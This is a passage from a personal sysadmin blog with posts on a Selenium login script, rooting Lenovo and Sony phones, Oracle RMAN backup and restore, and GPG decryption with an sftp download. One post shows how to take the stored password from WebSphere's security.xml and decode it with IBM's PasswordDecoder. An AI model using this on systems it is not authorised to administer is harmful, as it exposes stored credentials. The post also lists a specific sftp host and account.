class="line">		WebElement element2 = driver.findElement(By.name(&quot;password&quot;));</span><br><span class="line">		element2.sendKeys(new CharSequence[] &#123; &quot;vvv&quot; &#125;);</span><br><span class="line"></span><br><span class="line">		// Now submit the form. WebDriver will find the form for us from the element</span><br><span class="line">		element.submit();</span><br><span class="line"></span><br><span class="line">		// Check the title of the page</span><br><span class="line">		System.out.println(&quot;Page title is: &quot; + driver.getTitle());</span><br><span class="line"></span><br><span class="line">		try &#123;</span><br><span class="line">			WebElement button = (new WebDriverWait(driver, 20)).until(new Function&lt;WebDriver, WebElement&gt;() &#123;</span><br><span class="line">				public WebElement apply(WebDriver driver) &#123;</span><br><span class="line">					List&lt;WebElement&gt; els = driver.findElements(By.id(&quot;kd-376&quot;));</span><br><span class="line">					if (!els.isEmpty()) &#123;</span><br><span class="line">						return els.get(0);</span><br><span class="line">					&#125;</span><br><span class="line">					return null;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;);</span><br><span class="line"></span><br><span class="line">			if (button != null) &#123;</span><br><span class="line">				button.click();</span><br><span class="line">				new WebDriverWait(driver, 10);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		System.out.println(&quot;Page title is: &quot; + driver.getTitle());</span><br><span class="line"></span><br><span class="line">		//Close the browser</span><br><span class="line">		driver.quit();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Root-lenovo-A916-and-Sony-Xperia-T2-Ultra" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-06-04T10:13:04.000Z"><a href="/2015/06/04/Root-lenovo-A916-and-Sony-Xperia-T2-Ultra/">2015-06-04</a></time>
      
      
  
    <h1 class="title"><a href="/2015/06/04/Root-lenovo-A916-and-Sony-Xperia-T2-Ultra/">Root lenovo A916 and Sony Xperia T2 Ultra</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>Root lenovo A916 and Sony Xperia T2 Ultra.<br>Download adb and fastboot1. </p>
<ul>
<li>In windows, download <a target="_blank" rel="noopener" href="http://downloads.rubenalamina.mx/custom-installers/Android%20ADB%20Fastboot%201.3.msi">Android ADB Fastboot 1.3.msi</a></li>
<li>In Ubuntu, <code>apt-get install android-tools-adb android-tools-fastboot</code> unlock bootloader, flash cwm-recovery and root phone<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">adb reboot-bootloader</span><br><span class="line">fastboot devices</span><br><span class="line">fastboot oem unlock</span><br><span class="line">fastboot reboot</span><br><span class="line">fastboot flash recovery cwm-recovery.img</span><br><span class="line">fastboot reboot</span><br><span class="line">adb push UPDATE-SuperSU-v2.46.zip /sdcard/</span><br><span class="line">Install SuperSU zip according by ClockworkMod menu</span><br></pre></td></tr></table></figure></li>
</ul>
<p>Extra: check information</p>
<ul>
<li>A916 -&gt; adb reboot recovery -&gt; check internel version, found version: A916_S205_141013, call <code>*#*#5448264#*#*</code> to enable dual sim dual standby</li>
<li>D5303 -&gt; call <code>*#*#7378423#*#*</code> to check service information</li>
</ul>
<p>Reference:<br>Dual Sim card dual standby <a target="_blank" rel="noopener" href="http://ask.lenovomobile.com/index.php?question/view/598417.html">http://ask.lenovomobile.com/index.php?question/view/598417.html</a><br><a target="_blank" rel="noopener" href="https://forums.lenovo.com/t5/A-and-P-Series/Lenovo-phone-a916-A916-S1205-141013/td-p/2049911">https://forums.lenovo.com/t5/A-and-P-Series/Lenovo-phone-a916-A916-S1205-141013/td-p/2049911</a><br><a target="_blank" rel="noopener" href="http://pdadb.net/index.php?m=specs&amp;id=6663&amp;c=lenovo_a916_dual_sim_td-lte">http://pdadb.net/index.php?m=specs&amp;id=6663&amp;c=lenovo_a916_dual_sim_td-lte</a></p>
<p>Download A916 offical ROM and CWM Recovery <a target="_blank" rel="noopener" href="http://ask.lenovomobile.com/?q-594219.html">http://ask.lenovomobile.com/?q-594219.html</a></p>
<p>Dual SIM Dual Standby Official ROM <a target="_blank" rel="noopener" href="http://blog.cellphonemic.com/?p=624">http://blog.cellphonemic.com/?p=624</a><br>Recovery <a target="_blank" rel="noopener" href="http://blog.cellphonemic.com/?p=694">http://blog.cellphonemic.com/?p=694</a><br>One Key Root <a target="_blank" rel="noopener" href="http://blog.cellphonemic.com/?p=627">http://blog.cellphonemic.com/?p=627</a></p>
<p>unlock bootloader of T2 Ultra <a target="_blank" rel="noopener" href="http://developer.sonymobile.com/unlockbootloader/">http://developer.sonymobile.com/unlockbootloader/</a></p>
<p>HTC&#x2F;华为&#x2F;酷派手机官方解锁教程 <a target="_blank" rel="noopener" href="http://bbs.360safe.com/thread-4954939-1-1.html">http://bbs.360safe.com/thread-4954939-1-1.html</a></p>
<p>All in this post (VERY USEFUL) <a target="_blank" rel="noopener" href="http://forum.xda-developers.com/showthread.php?t=2788632">[GUIDE] OnePlus One - How to Unlock Bootloader, Install Custom Recovery and Root</a></p>
<p><a target="_blank" rel="noopener" href="http://forum.gamer.com.tw/C.php?bsn=60528&snA=4057">【攻略】Android 進階開發教學：讓你一次補足所有知識！</a></p>
<p>lifehacker<br><a target="_blank" rel="noopener" href="http://lifehacker.com/the-most-useful-things-you-can-do-with-adb-and-fastboot-1590337225">The Most Useful Things You Can Do with ADB and Fastboot on Android</a><br><a target="_blank" rel="noopener" href="http://lifehacker.com/how-to-flash-a-rom-to-your-android-phone-30885281">How to Flash a ROM to Your Android Phone</a></p>
<p>WIKI Of CM and CWM recovery <a target="_blank" rel="noopener" href="http://wiki.cyanogenmod.org/w/Doc:_fastboot_intro">http://wiki.cyanogenmod.org/w/Doc:_fastboot_intro</a><br>(fix the issue of “wait for the device”)<br><a target="_blank" rel="noopener" href="http://wiki.cyanogenmod.org/w/All_About_Recovery_Images">http://wiki.cyanogenmod.org/w/All_About_Recovery_Images</a><br><a target="_blank" rel="noopener" href="http://wiki.cyanogenmod.org/w/ClockWorkMod_Instructions">http://wiki.cyanogenmod.org/w/ClockWorkMod_Instructions</a></p>
<p>Unlock bootloader and install recovery<br><a target="_blank" rel="noopener" href="http://playfuldroid.com/how-to-root-lenovo-a916-phablet-in-less-than-an-hour/">How to root Lenovo A916 phablet in less than an hour</a><br><a target="_blank" rel="noopener" href="http://http//www.cwm-twrp-recovery.org/mp3-0/lenovo-a916-6855.html">Download CWM &amp; TWRP Recovery for Lenovo A916</a><br><a target="_blank" rel="noopener" href="https://forums.oneplus.net/threads/root-recovery-root.61595/">用臨時Recovery root機</a><br><a target="_blank" rel="noopener" href="http://www.androidtablets.net/threads/howto-unlocking-the-bootloader-windows.52434/">[HowTo] Unlocking the Bootloader (Windows)</a></p>
<p>Reference:<br>木子软件 <a target="_blank" rel="noopener" href="http://www.muzisoft.com/recovery/">http://www.muzisoft.com/recovery/</a> <a target="_blank" rel="noopener" href="http://www.muzisoft.com/root/">http://www.muzisoft.com/root/</a><br>刷机网 <a target="_blank" rel="noopener" href="http://www.shuaji.net/">http://www.shuaji.net/</a><br>线刷宝 - 华为fastboot机型解锁教程 <a target="_blank" rel="noopener" href="http://www.xianshuabao.com/skill/285.html">http://www.xianshuabao.com/skill/285.html</a></p>
<p>Root Sony WT19i<br><a target="_blank" rel="noopener" href="http://forum.xda-developers.com/showthread.php?t=1559685">http://forum.xda-developers.com/showthread.php?t=1559685</a><br><a target="_blank" rel="noopener" href="http://forum.xda-developers.com/showthread.php?t=1865037">http://forum.xda-developers.com/showthread.php?t=1865037</a><br><a target="_blank" rel="noopener" href="http://www.android.gs/root-sony-xperia-live-walkman-wt19i/">http://www.android.gs/root-sony-xperia-live-walkman-wt19i/</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Backup- OR -Restore-Oracle-DB" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-05-14T02:12:19.000Z"><a href="/2015/05/14/Backup-%20OR%20-Restore-Oracle-DB/">2015-05-14</a></time>
      
      
  
    <h1 class="title"><a href="/2015/05/14/Backup-%20OR%20-Restore-Oracle-DB/">Backup / Restore Oracle DB</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li>Backup Oracle DB in NOARCHIVELOG mode.In sqlplus console,<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ sqlplus / as sysdba (sqlplus /nolog then conn /as sysdba)</span><br><span class="line">SQL&gt; archive log list;</span><br><span class="line">SQL&gt; show parameter DB_RECOVERY_FILE_DEST;</span><br><span class="line">SQL&gt; alter system set db_recovery_file_dest=&#x27;/flash_recovery_area&#x27; scope=both;</span><br><span class="line">SQL&gt; shutdown immediate;</span><br><span class="line">SQL&gt; startup mount;</span><br><span class="line"> // at this time, run RMAN&gt; backup database;</span><br><span class="line"> // OR change archive log mode</span><br><span class="line">SQL&gt; alter database archivelog;</span><br><span class="line">SQL&gt; alter database open;</span><br><span class="line">SQL&gt; archive log list;</span><br><span class="line">SQL&gt; alter system switch logfile; ( OR alter system archive log current)</span><br><span class="line">SQL&gt; select operation, status, mbytes_processed, start_time, end_time from v$rman_status order by start_time;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>If archivelog mode is enabled</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RMAN&gt; backup incremental level 0 database plus archivelog delete input;</span><br><span class="line">OR</span><br><span class="line">RMAN&gt; backup as compressed backupset incremental level 0 database include current controlfile plus archivelog;</span><br><span class="line">OR</span><br><span class="line">RMAN&gt; backup as compressed backupset incremental level 0 database include current controlfile plus archivelog delete all input;</span><br><span class="line">ADN</span><br><span class="line">RMAN&gt; backup incremental level 1 database plus archivelog delete input;</span><br></pre></td></tr></table></figure>

<p>In rman prompt,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ rman</span><br><span class="line">RMAN&gt; connect target /;</span><br><span class="line">RMAN&gt; list backup;</span><br><span class="line">RMAN&gt; list backup summary;</span><br><span class="line">RMAN&gt; backup as compressed backupset tag &#x27;weeekly_prd01_tbls_bk_only&#x27; tablespace prd01;</span><br><span class="line">RMAN&gt; backup as compressed backupset database plus archivelog ;</span><br><span class="line"></span><br><span class="line">RMAN&gt; run &#123;  # backup directly in noarchive mode</span><br><span class="line">shutdown immediate;</span><br><span class="line">startup mount;</span><br><span class="line">backup database;</span><br><span class="line">alter database open;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">RMAN&gt; show all;</span><br><span class="line">CONFIGURE RETENTION POLICY TO REDUNDANCY 1;</span><br><span class="line">CONFIGURE BACKUP OPTIMIZATION ON;</span><br><span class="line">CONFIGURE DEFAULT DEVICE TYPE TO DISK;</span><br><span class="line">CONFIGURE CONTROLFILE AUTOBACKUP ON;</span><br><span class="line">CONFIGURE CONTROLFILE AUTOBACKUP FORMAT FOR DEVICE TYPE DISK TO &#x27;/tmp/backup/%F&#x27;;</span><br><span class="line">CONFIGURE DEVICE TYPE DISK PARALLELISM 1 BACKUP TYPE TO BACKUPSET;</span><br><span class="line">CONFIGURE DATAFILE BACKUP COPIES FOR DEVICE TYPE DISK TO 1;</span><br><span class="line">CONFIGURE ARCHIVELOG BACKUP COPIES FOR DEVICE TYPE DISK TO 1;</span><br><span class="line">CONFIGURE CHANNEL DEVICE TYPE DISK FORMAT   &#x27;/tmp/backup/dbkup_%Y%M%D_%U&#x27;;</span><br><span class="line">CONFIGURE MAXSETSIZE TO UNLIMITED;</span><br><span class="line">CONFIGURE ENCRYPTION FOR DATABASE OFF;</span><br><span class="line">CONFIGURE ENCRYPTION ALGORITHM &#x27;AES128&#x27;;</span><br><span class="line">CONFIGURE COMPRESSION ALGORITHM &#x27;BASIC&#x27; AS OF RELEASE &#x27;DEFAULT&#x27; OPTIMIZE FOR LOAD TRUE;</span><br><span class="line">CONFIGURE ARCHIVELOG DELETION POLICY TO NONE;</span><br><span class="line">CONFIGURE SNAPSHOT CONTROLFILE NAME TO &#x27;/u01/app/oracle/product/11.2.0/dbhome_1/dbs/snapcf_CHHDEV2.f&#x27;;</span><br></pre></td></tr></table></figure>

<p>Full version of backup</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/ksh</span><br><span class="line"></span><br><span class="line">DATABASE=CHHDEV2</span><br><span class="line"></span><br><span class="line">RUNTIME=`date &#x27;+%H%M_%d%m%Y&#x27;`</span><br><span class="line"></span><br><span class="line">BACKUPDIR=/tmp/backup</span><br><span class="line"></span><br><span class="line">LOGFILE=$&#123;BACKUPDIR&#125;/$&#123;ORACLE_SID&#125;_$&#123;RUNTIME&#125;.log</span><br><span class="line"></span><br><span class="line">LEVEL=0</span><br><span class="line"></span><br><span class="line">exec &gt;&gt; $&#123;LOGFILE&#125; 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">$ORACLE_HOME/bin/rman msgno target / nocatalog &lt;&lt;EOF!</span><br><span class="line"></span><br><span class="line">CONFIGURE RETENTION POLICY TO REDUNDANCY 3; # default 1</span><br><span class="line"></span><br><span class="line"># CONFIGURE RETENTION POLICY TO RECOVERY WINDOW OF 14 DAYS; # default 1</span><br><span class="line"></span><br><span class="line">CONFIGURE BACKUP OPTIMIZATION ON; # default OFF</span><br><span class="line"></span><br><span class="line">CONFIGURE DEFAULT DEVICE TYPE TO DISK; # default</span><br><span class="line"></span><br><span class="line">CONFIGURE CONTROLFILE AUTOBACKUP ON; # default OFF</span><br><span class="line"></span><br><span class="line">CONFIGURE CONTROLFILE AUTOBACKUP FORMAT FOR DEVICE TYPE DISK TO &#x27;$&#123;BACKUPDIR&#125;/ora_cf%F&#x27;; # default &#x27;%F&#x27;</span><br><span class="line"></span><br><span class="line">CONFIGURE DEVICE TYPE DISK PARALLELISM 3; # default 1</span><br><span class="line"></span><br><span class="line">CONFIGURE DATAFILE BACKUP COPIES FOR DEVICE TYPE DISK TO 1; # default</span><br><span class="line"></span><br><span class="line">CONFIGURE ARCHIVELOG BACKUP COPIES FOR DEVICE TYPE DISK TO 1; # default</span><br><span class="line"></span><br><span class="line">CONFIGURE CHANNEL DEVICE TYPE DISK FORMAT &#x27;$&#123;BACKUPDIR&#125;/ora_df%t_s%s_s%p&#x27;;</span><br><span class="line"></span><br><span class="line">CONFIGURE MAXSETSIZE TO UNLIMITED; # default</span><br><span class="line"></span><br><span class="line">CONFIGURE SNAPSHOT CONTROLFILE NAME TO &#x27;$&#123;BACKUPDIR&#125;/snapcf_$&#123;DATABASE&#125;.f&#x27;;</span><br><span class="line"></span><br><span class="line">SHOW ALL;</span><br><span class="line"></span><br><span class="line">sql &quot;alter system switch logfile&quot;;</span><br><span class="line"></span><br><span class="line">CROSSCHECK ARCHIVELOG ALL;</span><br><span class="line"></span><br><span class="line"># BACKUP AS COMPRESSED BACKUPSET INCREMENTAL LEVEL 0 DATABASE INCLUDE CURRENT CONTROLFILE PLUS ARCHIVELOG DELETE ALL INPUT;</span><br><span class="line"></span><br><span class="line"># BACKUP AS COMPRESSED BACKUPSET DATABASE INCLUDE CURRENT CONTROLFILE PLUS ARCHIVELOG DELETE ALL INPUT;</span><br><span class="line"></span><br><span class="line"># BACKUP DATABASE INCLUDE CURRENT CONTROLFILE PLUS ARCHIVELOG DELETE ALL INPUT;</span><br><span class="line"></span><br><span class="line"># backup AS COMPRESSED BACKUPSET database include current controlfile format &#x27;$&#123;BACKUPDIR&#125;/ora_df%t_s%s_s%p&#x27;;</span><br><span class="line"></span><br><span class="line"># backup AS COMPRESSED BACKUPSET archivelog UNTIL TIME &#x27;(SYSDATE - 1)&#x27; not backed up 1 times  format &#x27;$&#123;BACKUPDIR&#125;/ora_arc%t_s%s_s%p&#x27;;</span><br><span class="line"></span><br><span class="line"># delete noprompt archivelog until time &#x27;(SYSDATE -1)&#x27; backed up 1 times to device type disk;</span><br><span class="line"></span><br><span class="line">BACKUP AS COMPRESSED BACKUPSET INCREMENTAL LEVEL $&#123;LEVEL&#125; DATABASE INCLUDE CURRENT CONTROLFILE PLUS ARCHIVELOG;</span><br><span class="line"></span><br><span class="line">DELETE NOPROMPT COPY OF ARCHIVELOG ALL COMPLETED BEFORE &#x27;SYSDATE-5&#x27;;</span><br><span class="line"></span><br><span class="line">sql &quot;alter database backup controlfile to trace as &#x27;&#x27;$&#123;BACKUPDIR&#125;/ctrlfile_$&#123;DATABASE&#125;_$&#123;RUNTIME&#125;&#x27;&#x27;&quot;;</span><br><span class="line"></span><br><span class="line">allocate channel for maintenance type disk;</span><br><span class="line"></span><br><span class="line">delete noprompt obsolete device type disk;</span><br><span class="line"></span><br><span class="line">CROSSCHECK BACKUP;</span><br><span class="line"></span><br><span class="line">CROSSCHECK ARCHIVELOG ALL;</span><br><span class="line"></span><br><span class="line">REPORT OBSOLETE;</span><br><span class="line"></span><br><span class="line">DELETE FORCE NOPROMPT OBSOLETE;</span><br><span class="line"></span><br><span class="line">DELETE FORCE NOPROMPT expired backup of archivelog all;</span><br><span class="line"></span><br><span class="line">DELETE FORCE NOPROMPT expired backup;</span><br><span class="line"></span><br><span class="line">LIST BACKUP OF DATABASE;</span><br><span class="line"></span><br><span class="line">LIST BACKUP OF ARCHIVELOG ALL;</span><br><span class="line"></span><br><span class="line">LIST BACKUP;</span><br><span class="line"></span><br><span class="line">release channel;</span><br><span class="line"></span><br><span class="line">EXIT</span><br><span class="line"></span><br><span class="line">EOF!</span><br><span class="line"></span><br><span class="line">exit</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Store Oracle DB<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">RMAN&gt; SET DBID 70161972;</span><br><span class="line">RMAN&gt; RUN &#123;</span><br><span class="line">    startup force nomount;</span><br><span class="line">    SET CONTROLFILE AUTOBACKUP FORMAT FOR DEVICE TYPE DISK TO &#x27;/tmp/backup/%F&#x27;;</span><br><span class="line">    RESTORE CONTROLFILE to &#x27;/tmp/controlfile&#x27; FROM AUTOBACKUP;</span><br><span class="line">    RESTORE SPFILE to pfile &#x27;/tmp/pfile&#x27; FROM AUTOBACKUP;</span><br><span class="line">    //OR</span><br><span class="line">    restore controlfile from autobackup;</span><br><span class="line">    restore spfile from autobackup;</span><br><span class="line"></span><br><span class="line">    SET ARCHIVELOG DESTINATION TO &#x27;/tmp/temp_restore&#x27;;</span><br><span class="line">    RESTORE ARCHIVELOG ALL;</span><br><span class="line"></span><br><span class="line">    startup mount;</span><br><span class="line">    restore database;</span><br><span class="line">    recover database;</span><br><span class="line">    sql &#x27;alter database open RESETLOGS&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>Reference:<br><a target="_blank" rel="noopener" href="https://support.software.dell.com/netvault-backup/kb/140173">https://support.software.dell.com/netvault-backup/kb/140173</a><br><a target="_blank" rel="noopener" href="http://dbaworkshop.blogspot.hk/2012/07/how-to-backup-database-in-noarchivelog_31.html">http://dbaworkshop.blogspot.hk/2012/07/how-to-backup-database-in-noarchivelog_31.html</a><br><a target="_blank" rel="noopener" href="http://ss64.com/ora/rman_backup.html">http://ss64.com/ora/rman_backup.html</a><br><a target="_blank" rel="noopener" href="http://www.dba-oracle.com/t_rman_incremental_backups.htm">http://www.dba-oracle.com/t_rman_incremental_backups.htm</a><br><a target="_blank" rel="noopener" href="http://www.dba-oracle.com/concepts/rman_recovery_database_spfile.htm">http://www.dba-oracle.com/concepts/rman_recovery_database_spfile.htm</a><br><a target="_blank" rel="noopener" href="http://www.dba-oracle.com/concepts/rman.htm">http://www.dba-oracle.com/concepts/rman.htm</a><br><a target="_blank" rel="noopener" href="http://www.dba-oracle.com/concepts/rman_online_offline_backups.htm">http://www.dba-oracle.com/concepts/rman_online_offline_backups.htm</a><br><a target="_blank" rel="noopener" href="http://www.dba-village.com/village/dvp_forum.OpenThread?ThreadIdA=44077&amp;DestinationA=RSS">http://www.dba-village.com/village/dvp_forum.OpenThread?ThreadIdA=44077&amp;DestinationA=RSS</a><br><a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/E11882_01/backup.112/e10642/rcmadvre.htm">http://docs.oracle.com/cd/E11882_01/backup.112/e10642/rcmadvre.htm</a><br><a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/B19306_01/backup.102/b14192/recov004.htm#i1032364">http://docs.oracle.com/cd/B19306_01/backup.102/b14192/recov004.htm#i1032364</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Decode OR Encode-websphere-database-password" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-05-11T09:14:53.000Z"><a href="/2015/05/11/Decode%20OR%20Encode-websphere-database-password/">2015-05-11</a></time>
      
      
  
    <h1 class="title"><a href="/2015/05/11/Decode%20OR%20Encode-websphere-database-password/">Decode/Encode websphere database password</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li><p>Locate the file at <code>/usr/IBM/WebSphere/AppServer/profiles/AppSrvMars01/config/cells/mars01Cell01/security.xml</code></p>
</li>
<li><p>Find the “authDataEntries” tag and then get the password attribute.</p>
</li>
<li><p>Open console and goto directory <code>/usr/IBM/WebSphere/AppServer</code>,<br>  <strong>encode</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp plugins/com.ibm.ws.runtime.jar:lib/bootstrap.jar:runtimes/com.ibm.jaxws.thinclient_7.0.0.jar com.ibm.ws.security.util.PasswordEncoder password</span><br></pre></td></tr></table></figure>
<p>  <strong>decode</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp plugins/com.ibm.ws.runtime.jar:lib/bootstrap.jar:runtimes/com.ibm.jaxws.thinclient_7.0.0.jar com.ibm.ws.security.util.PasswordDecoder &#123;xor&#125;Lz4sLCgwLTs=</span><br></pre></td></tr></table></figure></li>
</ul>
<p>Reference:<br><a target="_blank" rel="noopener" href="http://www.sysman.nl/wasdecoder/">http://www.sysman.nl/wasdecoder/</a><br><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/7885134/how-to-recover-admin-password-in-websphere-portal-v7">http://stackoverflow.com/questions/7885134/how-to-recover-admin-password-in-websphere-portal-v7</a><br><a target="_blank" rel="noopener" href="http://weblogic-wonders.com/weblogic/tag/com-ibm-ws-bootstrap-raswsloggerfactory/">http://weblogic-wonders.com/weblogic/tag/com-ibm-ws-bootstrap-raswsloggerfactory/</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Decrypt-file-with-GPG-and-Download-m3u8-file" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-04-15T08:45:15.000Z"><a href="/2015/04/15/Decrypt-file-with-GPG-and-Download-m3u8-file/">2015-04-15</a></time>
      
      
  
    <h1 class="title"><a href="/2015/04/15/Decrypt-file-with-GPG-and-Download-m3u8-file/">Decrypt file with GPG and Download m3u8 file</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Decrypt-file-with-GPG"><a href="#Decrypt-file-with-GPG" class="headerlink" title="Decrypt file with GPG"></a>Decrypt file with GPG</h1><ul>
<li>Import keys to gpg<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gpg –import secring.skr</span><br><span class="line">gpg –import pubring.pkr</span><br><span class="line">gpg –list-keys</span><br></pre></td></tr></table></figure>
result as below, <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pub 2048R/82F66E2C 2014-01-06 [expires: 2017-01-06]</span><br><span class="line">Key fingerprint = 4BA1 30AA 793A 1D54 2787  F287 F87E 5CFF 82F6 6E2C</span><br><span class="line">uid xxxx-999999999-20140106 sub 2048R/A1EBDC74 2014-01-06 [expires: 2017-01-06]</span><br><span class="line">pub 4096R/A05189D6 2014-01-02 [expires: 2017-12-31]</span><br><span class="line">Key fingerprint = 674A 9A1D 5675 ED25 802C  574C F591 50E3 A051 89D6</span><br><span class="line">uid CEMailBxHKEPSC2017-12-31 sub 4096R/B47C7A5B 2014-01-02 [expires: 2017-12-31]</span><br></pre></td></tr></table></figure></li>
<li>Run <code>sftp -P 38024 ephp2650@203.112.90.74</code> to login</li>
<li>Download PPSCDDMMYY.pgp from server</li>
<li>Run <code>gpg PPSCDDMMYY.pgp</code> to decrypt and <code>mv PPSCDDMMYY PPSCDDMMYY.zip</code> and <code>unzip PPSCDDMMYY.zip</code> to get file <strong>MERCHANT.TXT</strong></li>
</ul>
<h1 id="Download-m3u8-file"><a href="#Download-m3u8-file" class="headerlink" title="Download m3u8 file"></a>Download m3u8 file</h1><ul>
<li>Install Chrome Cache View from <a target="_blank" rel="noopener" href="http://www.nirsoft.net/utils/chrome_cache_view.html">NirSoft</a></li>
